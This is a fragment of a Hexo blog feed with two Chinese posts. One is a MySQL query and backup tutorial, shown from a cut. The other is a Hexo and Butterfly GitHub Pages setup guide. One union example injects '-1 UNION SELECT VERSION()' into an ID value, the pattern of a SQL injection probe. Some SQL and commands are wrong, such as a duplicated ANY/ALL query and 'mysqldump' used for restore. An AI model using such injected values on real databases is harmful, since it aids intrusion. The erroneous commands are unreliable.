title="联合查询"></a>联合查询</h2><p>– 联合查询: 同时执行多条查询语句，将结果一起输出 union<br>SELECT info_name FROM stu_INFO WHERE INFO_ID=[-1 UNION SELECT VERSION()] LIMIT 0, 1;</p><p>– 联合查询是自动去重的，通过 ALL 可以获取所有数据<br>SELECT 1 UNION ALL SELECT 1;</p><p>– 分组查询<br>SELECT * FROM stu_info;</p><h2 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h2><p>– 分组查询，在这个例子中，先查询到每个组，再执行 COUNT 操作<br>SELECT info_class, COUNT(*) FROM stu_info GROUP BY info_class;</p><p>– 这里获取了每一组的内容<br>SELECT DISTINCT info_class FROM stu_info;</p><p>SELECT COUNT(<em>) FROM stu_info WHERE info_class=1 UNION ALL<br>SELECT COUNT(</em>) FROM stu_info WHERE info_class=2 UNION ALL<br>SELECT COUNT(*) FROM stu_info WHERE info_class=3;</p><p>– 带条件的分组查询，查询班级号大于 2 的班级有多少人<br>SELECT info_class FROM stu_info GROUP BY info_class HAVING info_class &gt; 2;</p><p>– 分页显示查询结果（从第0条开始，取3条）<br>SELECT * from table_name LIMIT 0, 3;</p><p>– 交叉连接，产生的结果是笛卡尔积<br>SELECT * FROM stu_info, stu_class;</p><p>– 内连接，带条件的多表查询<br>SELECT * FROM stu_info, stu_class WHERE stu_info.info_class = stu_class.class_id;</p><p>– 即使右边的表不存在左边的字段，也会以 null 的方式打印出来<br>select * from stu_info left join stu_class on stu_info.info_class = stu_class.class_id;</p><p>– 如果这个班级位于下面的搜索结果中，就输出所有信息<br>SELECT * FROM stu_class WHERE class_id in (<br>    – 如果有同学是男生，就输出它的班级号<br>    SELECT info_class FROM stu_info WHERE info_sex = “男”<br>);</p><p>– 如果有同学的分数大于80，就输出前三名的信息和对应的班级信息<br>SELECT * FROM stu_class, stu_info WHERE EXISTS(<br>    – 搜索目标成绩大于 80 分的学生，如果有就是 TRUE，否则是 FALSE<br>    SELECT info_score FROM stu_info WHERE info_score &gt; 80<br>) AND stu_class.class_id = stu_info.info_class<br>ORDER BY info_score DESC LIMIT 0, 3;</p><p>– 如果有男生的成绩大于任何一个女生，并且存在对应的班级信息，就输出这个男生的信息<br>SELECT * FROM stu_info, stu_class WHERE<br>    info_score &lt;ANY(<br>        SELECT info_score FROM stu_info WHERE info_sex=”女”<br>    ) AND<br>info_sex=’男’ AND stu_info.info_class = stu_class.class_id;</p><p>– 如果有男生的成绩大于所有女生，并且存在对应的班级信息，就输出这个男生的信息<br>SELECT * FROM stu_info, stu_class WHERE<br>    info_score &lt;ANY(<br>        SELECT info_score FROM stu_info WHERE info_sex=”女”<br>    ) AND<br>info_sex=’男’ AND stu_info.info_class = stu_class.class_id;</p><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>– 数据库备份<br>mysqldump -u root -p tankwar_net &gt; d:/tankwar_net_10_15.sql<br>– 数据库还原 一<br>mysqldump -u root -p tankwar_net &lt; d:/tankwar_net_10_15.sql<br>– 数据库还原 二<br>mysql&gt; use tankwar_net<br>Database changed<br>mysql&gt; source d:/tankwar_net_10_15.sql;</p>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github+hexo+butterfly的搭建部署及美化</title>
      <link href="2020/12/05/hexo-buttfly-%E7%BE%8E%E5%8C%96/"/>
      <url>2020/12/05/hexo-buttfly-%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建github博客"><a href="#搭建github博客" class="headerlink" title="搭建github博客"></a>搭建github博客</h1><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>新建一个名为<code>你的用户名.github.io</code>的仓库，比如说，如果你的github用户名是hugang-first，那么你就新建<code>hugang-first.github.io</code>的仓库（必须是你的用户名，其它名称无效），将来你的网站访问地址就是 <a href="http://hugang-first.github.io/">http://hugang-first.github.io</a> 了，是不是很方便？</p><p>由此可见，每一个github账户最多只能创建一个这样可以直接使用域名访问的仓库。</p><p>几个注意的地方：</p><ol><li>注册的邮箱一定要验证，否则不会成功；</li><li>仓库名字必须是：<code>username.github.io</code>，其中<code>username</code>是你的用户名；</li></ol><h1 id="本地搭建hexo-butterfly"><a href="#本地搭建hexo-butterfly" class="headerlink" title="本地搭建hexo+butterfly"></a>本地搭建hexo+butterfly</h1><p>nodejs：下载 <a href="https://nodejs.org/en/download/">点击这里快捷电梯</a></p><p>git：下载 <a href="https://git-scm.com/download/">点击这里快捷电梯</a></p><p>自己找一个位置创建目录作为你自己博客的根目录</p><p>在这个目录下鼠标右击-&gt;选择”Git Bash Here”后进入git的bash界面</p><p>输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//第一条   这是安装hexo的基础框架</span><br><span class="line">npm install -g hexo</span><br><span class="line"></span><br><span class="line">//第二条   这是初始化hexo框架 这个可能会比较慢</span><br><span class="line">hexo init</span><br><span class="line"></span><br><span class="line">//第三条 安装所需要的组件</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">//第四条 编译生成静态页面</span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">//第五条 启动本地服务</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>在浏览器中输入 <a href="http://localhost:4000/">http://localhost:4000/</a> 你将会看到一个初始的博客界面</p><p>我们继续回到bash命令界面 Ctrl+c结束后</p><p>输入下面这条命令将会下载butterfly主题到博客根目录下的themes文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly </span><br></pre></td></tr></table></figure><p>修改博客根目录下的配置文件_config.yml，找到theme：字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>如果没有渲染插件就需要下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>再次运行一下命令后进浏览器输入<a href="http://localhost:4000/">http://localhost:4000/</a> 查看更改butterfly主题有点效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//编译生成静态页面</span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">// 启动本地服务</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><h2 id="配置SSH-key"><a href="#配置SSH-key" class="headerlink" title="配置SSH key"></a>配置SSH key</h2><p>为什么要配置这个呢？因为你提交代码肯定要拥有你的github权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/. ssh <span class="comment">#检查本机已存在的ssh密钥</span></span><br></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用git。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure><p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809183636504.png" alt="image-20200809183636504"></p><p>将刚复制的内容粘贴到key那里，title随便填，保存。</p><h2 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com # 注意邮箱地址不用改</span><br></pre></td></tr></table></figure><p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p><blockquote><p>Hi liuxianan! You’ve successfully authenticated, but GitHub does not provide shell access.</p></blockquote><p>看到这个信息说明SSH已配置成功！</p><p>此时你还需要配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;liuxianan&quot;&#x2F;&#x2F; 你的github用户名，非昵称</span><br><span class="line">$ git config --global user.email  &quot;xxx@qq.com&quot;&#x2F;&#x2F; 填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>具体这个配置是干嘛的我没仔细深究。</p><h1 id="使用hexo写博客"><a href="#使用hexo写博客" class="headerlink" title="使用hexo写博客"></a>使用hexo写博客</h1><h2 id="hexo简介"><a href="#hexo简介" class="headerlink" title="hexo简介"></a>hexo简介</h2><p>Hexo是一个简单、快速、强大的基于 Github Pages 的博客发布工具，支持Markdown格式，有众多优秀插件和主题。</p><p>官网： <a href="http://hexo.io/">http://hexo.io</a><br>github: <a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>安装之前先来说几个注意事项：</p><ol><li>很多命令既可以用Windows的cmd来完成，也可以使用git bash来完成，但是部分命令会有一些问题，为避免不必要的问题，建议全部使用git bash来执行；</li><li>hexo不同版本差别比较大，网上很多文章的配置信息都是基于2.x的，所以注意不要被误导；</li><li>hexo有2种<code>_config.yml</code>文件，一个是根目录下的全局的<code>_config.yml</code>，一个是各个<code>theme</code>下的；</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>在电脑的某个地方新建一个名为hexo的文件夹（名字可以随便取），比如我的是<code>D:\MyBlog</code>，由于这个文件夹将来就作为你存放代码的地方，所以最好不要随便放。接下来在自己博客根目录打开GitBashHere</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809184532454.png" alt="image-20200809184532454"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure><p>hexo会自动下载一些文件到这个目录，包括node_modules</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure><p>执行以上命令之后，hexo就会在public文件夹生成相关html文件，这些文件将来都是要提交到github去的：</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809184659887.png" alt="image-20200809184659887"></p><p><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a> 即可看到内容lo World 的文章</p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p>既然默认主题很丑，那我们别的不做，首先来替换一个好看点的主题。这是 <a href="https://hexo.io/themes/">官方主题</a>。</p><p>个人比较喜欢的主题：</p><p>首先下载这个主题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>下载后的主题都在这里：博客根目录下的themes/</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809184309579.png" alt="image-20200809184309579"></p><p>修改<code>_config.yml</code>中的<code>theme: landscape</code>改为<code>theme: yilia</code>，然后重新执行<code>hexo g</code>来重新生成。</p><p>如果出现一些莫名其妙的问题，可以先执行<code>hexo clean</code>来清理一下public的内容，然后再来重新生成和发布。</p><h2 id="上传之前"><a href="#上传之前" class="headerlink" title="上传之前"></a>上传之前</h2><p>在上传代码到github之前，一定要记得先把你以前所有代码下载下来（虽然github有版本管理，但备份一下总是好的），因为从hexo提交代码时会把你以前的所有代码都删掉。</p><h2 id="上传到github"><a href="#上传到github" class="headerlink" title="上传到github"></a>上传到github</h2><p>如果你一切都配置好了，发布上传很容易，一句<code>hexo d</code>就搞定，当然关键还是你要把所有东西配置好。</p><p>首先，<code>ssh key</code>肯定要配置好。</p><p>其次，配置<code>_config.yml</code>中有关deploy的部分：</p><p>首先进入自己的仓库，点击usessh，将ssh地址复制到repository：</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809185405011.png" alt="image-20200809185405011"></p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809185444230.png" alt="image-20200809185444230"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:hugang-first&#x2F;hugang-first.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h1 id="主题的安装和升级"><a href="#主题的安装和升级" class="headerlink" title="主题的安装和升级"></a>主题的安装和升级</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>在你博客的根目录里</p><p>bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https:&#x2F;&#x2F;github.com&#x2F;jerryc127&#x2F;hexo-theme-butterfly.git themes&#x2F;Butterfly</span><br></pre></td></tr></table></figure><h2 id="应用主题"><a href="#应用主题" class="headerlink" title="应用主题"></a>应用主题</h2><p>修改站点的配置文件<code>_config.yml</code>把主题改为<code>Butterfly</code></p><p>yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: Butterfly</span><br></pre></td></tr></table></figure><p>如果你没有pug以及stylus的渲染器，请下载安装:<code>npm install hexo-renderer-pug hexo-renderer-stylus --save</code> or <code>yarn add hexo-renderer-pug hexo-renderer-stylus</code></p><h2 id="平滑升级"><a href="#平滑升级" class="headerlink" title="平滑升级"></a>平滑升级</h2><p>为了让主题的平滑升级，<code>Butterfly</code>使用了<a href="https://hexo.io/docs/data-files.html">data files</a>特性。</p><p>推荐把默认主题的配置文件<code>_config.yml</code>复制到Hexo工作目录下的<code>source/_data/butterfly.yml</code>，如果<code>source/_data</code>的目录不存在那就创建一个。</p><p>注意·如果你创建了<code>butterfly.yml</code>，他将会替换主题的默认配置文件<code>_config.yml</code>里的配置项(<strong>不是合并而是替换</strong>)，之后你就只需要通过<code>git pull</code>的方式就可以平滑的升级<code>theme-butterfly</code>了。</p><h1 id="主题页面"><a href="#主题页面" class="headerlink" title="主题页面"></a>主题页面</h1><h2 id="Page-Front-matter"><a href="#Page-Front-matter" class="headerlink" title="Page Front-matter"></a>Page Front-matter</h2><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">type: (tags,link,categories这三个页面需要配置)</span><br><span class="line">comments: (是否开启评论，默认true)</span><br><span class="line">description:</span><br><span class="line">top_img: (设置顶部图)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="Post-Front-matter"><a href="#Post-Front-matter" class="headerlink" title="Post Front-matter"></a>Post Front-matter</h2><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img: (除非特定，可以不写)</span><br><span class="line">comments: 是否显示评论(除非设置false,可以不写)</span><br><span class="line">cover: 缩略图</span><br><span class="line">toc: 是否显示toc(除非特定文章设置，可以写)</span><br><span class="line">toc_number: 是否显示toc数字(除非特定文章设置，可以不写)</span><br><span class="line">copyright: 是否显示版权(除非特定文章设置，可以不写)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h2><ol><li>前往你的Hexo博客根目录</li><li>输入<code>hexo new page tags</code></li><li>你会找到<code>source/tags/index.md</code>这个文件</li><li>修改这个文件：</li></ol><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">tite: 标签</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: tags</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h2><ol><li>前往你的Hexo博客的根目录</li><li>输入<code>hexo new page categories</code></li><li>你会找到<code>source/categories/index.md</code>这个文件</li><li>修改这个文件:</li></ol><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h1 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h1><p>为你的博客添加友情链接！</p><h2 id="创建友情链接"><a href="#创建友情链接" class="headerlink" title="创建友情链接"></a>创建友情链接</h2><ol><li>前往你的Hexo博客的根目录</li><li>输入<code>hexo new page link</code></li><li>你会找到<code>source/link/index.md</code>这个文件</li><li>修改这个文件:</li></ol><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友情链接</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: link</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="友情链接添加"><a href="#友情链接添加" class="headerlink" title="友情链接添加"></a>友情链接添加</h2><p>在Hexo博客根目录中的<code>source/_data</code>创建一个文件<code>link.yml</code></p><p>yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class:</span><br><span class="line">  class_name: 友情链接</span><br><span class="line">  link_list:</span><br><span class="line">    1:</span><br><span class="line">      name: xxx</span><br><span class="line">      link: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">      avatar: https:&#x2F;&#x2F;xxx&#x2F;xxx&#x2F;avatar.png (也可以是本地文件)</span><br><span class="line">      descr: 添加描述</span><br><span class="line">    2：</span><br><span class="line">      name: xxx</span><br><span class="line">      link: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">      avatar: https:&#x2F;&#x2F;xxx&#x2F;xxx&#x2F;avatar.png (也可以是本地文件)</span><br><span class="line">      descr: 添加描述</span><br><span class="line"></span><br><span class="line">class2:</span><br><span class="line">  class_name: 无效链接</span><br><span class="line">  link_list:</span><br><span class="line">    1:</span><br><span class="line">      name: xxx</span><br><span class="line">      link: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">      avatar: https:&#x2F;&#x2F;xxx&#x2F;xxx&#x2F;avatar.png (也可以是本地文件)</span><br><span class="line">      descr: 添加描述</span><br><span class="line">     2:</span><br><span class="line">       name: xxx</span><br><span class="line">      link: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">      avatar: https:&#x2F;&#x2F;xxx&#x2F;xxx&#x2F;avatar.png (也可以是本地文件)</span><br><span class="line">      descr: 添加描述</span><br></pre></td></tr></table></figure><h2 id="友情链接界面设置"><a href="#友情链接界面设置" class="headerlink" title="友情链接界面设置"></a>友情链接界面设置</h2><p>需要添加友情链接，可以在<code>Butterfly.yml</code>配置<br>可以在友情链接上协商自己的个人资料，方便他人添加</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Flink:</span><br><span class="line">  headline: 友情链接</span><br><span class="line">  info_headline: 我的Blog资料</span><br><span class="line">  name: Blog 名字: xxx</span><br><span class="line">  address: Blog 地址: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">  avatar: Blog 头像: https:&#x2F;&#x2F;xxx.com</span><br><span class="line">  info: Blog 简介: xxx,xxx</span><br><span class="line">  comment: 如需交换友链，请留言</span><br></pre></td></tr></table></figure><h1 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h1><ul><li>站点配置文件<code>_config.yml</code>是hexo根目录下的配置文件</li><li><code>butterfly.yml</code>是<code>Butterfly</code>的配置文件，他需要你手动将主题目录下的<code>config.yml</code>文件复制到hexo根目录的<code>source/_data/butterfly.yml</code>中。如果文件或文件夹不存在，请手动创建。</li></ul><h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><p>修改站点配置文件<code>_config.yml</code>的<code>language</code>参数</p><p>默认语言是en</p><p>主题支持三种语言</p><ul><li>default(en)</li><li>zh-CN(简体中文)</li><li>zh-TW(繁体中文)</li></ul><h1 id="网站资料"><a href="#网站资料" class="headerlink" title="网站资料"></a>网站资料</h1><p>修改网站各种资料，列入标题、副标题和邮箱等个人资料，请修改博客根目录的<code>_config.yml</code></p><h1 id="导航菜单"><a href="#导航菜单" class="headerlink" title="导航菜单"></a>导航菜单</h1><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  Home: &#x2F; || fa fa-home</span><br><span class="line">  Archives: &#x2F;archives&#x2F; || fa fa-archive</span><br><span class="line">  Tags: &#x2F;tags&#x2F; || fa fa-tags</span><br><span class="line">  Categories: &#x2F;categories&#x2F; || fa fa-folder-open</span><br><span class="line">  Link: &#x2F;link&#x2F; || fa fa-link</span><br><span class="line">  About: &#x2F;about&#x2F; || fa fa-heart</span><br><span class="line">  list||fa fa-list:</span><br><span class="line">    - Music || &#x2F;music&#x2F; || fa fa-music</span><br><span class="line">    - Movie || &#x2F;movies&#x2F; || fa fa-film</span><br></pre></td></tr></table></figure><p>必须是<code>/xxx/</code>，后面<code>||</code>分开，然后写图标名，菜单名可以自己修改</p><p>格式化：</p><p>显示名称：</p><p>路径||icon</p><p>sub-menu格式</p><p>名称||icon:</p><ul><li>名称||路径||icon</li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><p><code>Butterfly</code>支持<a href="https://github.com/equinusocio/material-theme">Material Theme</a>5种高亮模式:</p><ul><li>default</li><li>darker</li><li>pale night</li><li>light</li><li>ocean</li></ul><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_theme: light</span><br></pre></td></tr></table></figure><p>default</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-default.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>darker</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-darker.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>pale night</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-darker.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p><strong>light</strong></p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-light.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>ocean</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-highlight-ocean.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h2><p>主题支持代码复制功能</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_copy: true</span><br></pre></td></tr></table></figure><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-copy.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="代码框展开-关闭"><a href="#代码框展开-关闭" class="headerlink" title="代码框展开/关闭"></a>代码框展开/关闭</h2><p>在默认情况下，代码框自动展开，可设置是否所有代码框都关闭状态，点击<code>&gt;</code>可展开代码</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_shrink: true #代码框不可展开，需点击&#39;&gt;&#39;打开</span><br></pre></td></tr></table></figure><p><code>highlight_shrink: true</code></p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-highlight-shrink-true.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/>`highlight_shrink: flase`<img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-highlight-shrink-false.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="代码换行"><a href="#代码换行" class="headerlink" title="代码换行"></a>代码换行</h2><p>在默认情况下，<code>hexo-highlight</code>在编译的时候不会实现代码自动换行，如果你不希望在代码块的区域里有横向滚动条的话，那么你可以考虑开启这个功能。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code_word_wrap: true</span><br></pre></td></tr></table></figure><p>然后找到你站点的Hexo配置文件<code>_config.yml</code>将<code>line_number</code>改成<code>false</code>:</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: flase</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace:</span><br></pre></td></tr></table></figure><p>设置<code>code_word_wrap</code>之前：</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-word-wrap-before.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>设置<code>code_word_wrap</code>之后：</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-code-word-wrap-after.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h1 id="社交图片"><a href="#社交图片" class="headerlink" title="社交图片"></a>社交图片</h1><p>Butterfly支持<a href="https://fontawesome.com/v4.7.0/">font-awesome v4</a>和<a href="https://fontawesome.com/icons?from=io">font-awecome v5</a>.如需开启<a href="https://fontawesome.com/icons?from=io">font-awecome v5</a>，需要在<code>Butterfly.yml</code>上开启</p><p>yaml</p><figure class="highlight plain"><table><tr><td 